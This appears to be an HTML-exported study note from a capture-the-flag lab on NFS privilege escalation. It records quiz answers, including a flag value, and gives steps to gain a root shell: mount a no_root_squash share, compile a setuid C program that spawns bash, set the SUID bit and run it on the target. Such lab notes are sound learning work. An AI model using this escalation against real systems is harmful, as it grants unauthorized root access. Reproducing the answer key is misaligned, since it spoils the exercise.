@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Task 11 - NFS</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">Task 11 - NFS</h1><br/><strong>How many mountable shares can you identify on the target system?</strong><br /><br />    ‘cat etc/exports’<br />    <br /><strong>    Answer: 3</strong><br /><strong><br />How many shares have the "no_root_squash" option enabled?</strong><br /><br />    All the folders listed have this attribute set.<br /><br />   <strong> Answer: 3</strong><br /><br /><strong>Gain a root shell on the target system</strong><br /><br />    Mount the /tmp folder as root on the attack machine:<br />        ‘mount -o rw &lt;IP&gt;:/tmp &lt;/folder&gt;’<br />        <br />    Then create a file that like the following, which executes bash as root user:<br />    <br />        <div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#include&nbsp;&lt;sys/types.h&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#include&nbsp;&lt;stdlib.h&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;main{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setgid(0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system("/bin/bash");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</div></div>      <br />    Compile it:<br />        ‘gcc &lt;file.c&gt; -o &lt;file&gt; -w’<br />        <br />    And set the SUID bit.<br />    <br />    Then leave the mounted folder and unmount it:<br />        umount &lt;folder&gt;<br />        <br />    Afterwards you can execute the created binary in the /tmp folder on the victim's box.<br /><br /><br /><br /><strong> What is the content of the flag7.txt file?</strong><br />    <br /><strong>    Answer: THM-89384012</strong></div></body></html>
